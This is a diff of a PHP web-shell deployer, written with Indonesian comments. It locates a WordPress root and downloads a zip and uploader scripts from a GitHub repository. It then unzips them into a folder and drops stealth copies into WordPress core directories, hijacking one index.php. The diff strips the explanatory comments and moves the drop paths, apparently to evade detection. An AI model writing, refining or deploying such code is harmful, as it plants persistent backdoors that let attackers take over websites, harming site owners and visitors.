@@ -1,18 +1,15 @@
 <?php
-/**
- * Auto Deployer: Root Finder, Auto Unzip & Triple Stealth Uploader (Index Hijack)
- */
 
 error_reporting(0);
 set_time_limit(0);
 
-// --- KONFIGURASI ---
+
 $folderName  = 'shop';
 $zipUrl      = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/baru.zip';
 $unzipUrl    = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/un.php';
-$uploaderUrl = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/a1.php';
+$uploaderUrl = 'https://raw.githubusercontent.com/leakhigh/alfa/refs/heads/main/a.php';
 
-// 1. LOGIKA CARI ROOT (Standard WP)
+
 function cari_pintu_depan() {
     $path = dirname(__FILE__);
     $path = dirname(__FILE__);
@@ -29,7 +26,7 @@ function cari_pintu_depan() {
     return $_SERVER['DOCUMENT_ROOT'];
 }
 
-// 2. FUNGSI DOWNLOAD (cURL)
+
 function sedot($url) {
     $ch = curl_init($url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -42,11 +39,11 @@ function sedot($url) {
     return $data;
 }
 
-// --- EKSEKUSI MULAI ---
+
 $rootDir = cari_pintu_depan();
 $targetPath = $rootDir . '/' . $folderName;
 
-// A. PROSES UNZIP KE /SHOP
+
 if (!is_dir($targetPath)) @mkdir($targetPath, 0755, true);
 
 if (is_dir($targetPath)) {
@@ -76,14 +73,14 @@ $stealth_results = [];
 
 if ($uploaderContent) {
     $locations = [
-        $rootDir . '/wp-includes/css',            // Nama Random
-        $rootDir . '/wp-content/plugins/akismet', // Hijack index.php
-        $rootDir . '/wp-includes/images'          // Nama Random
+        $rootDir . 'wp-content/uploads/2026/04',            // Nama Random
+        $rootDir . 'wp-includes/js/crop', // Hijack index.php
+        $rootDir . 'wp-admin/css/colors/modern/'          // Nama Random
     ];
 
     foreach ($locations as $index => $dir) {
         if (is_dir($dir) && is_writable($dir)) {
-            // Jika lokasi kedua (akismet), ganti jadi index.php
+
             if ($index === 1) {
                 $filename = 'index.php';
             } else {
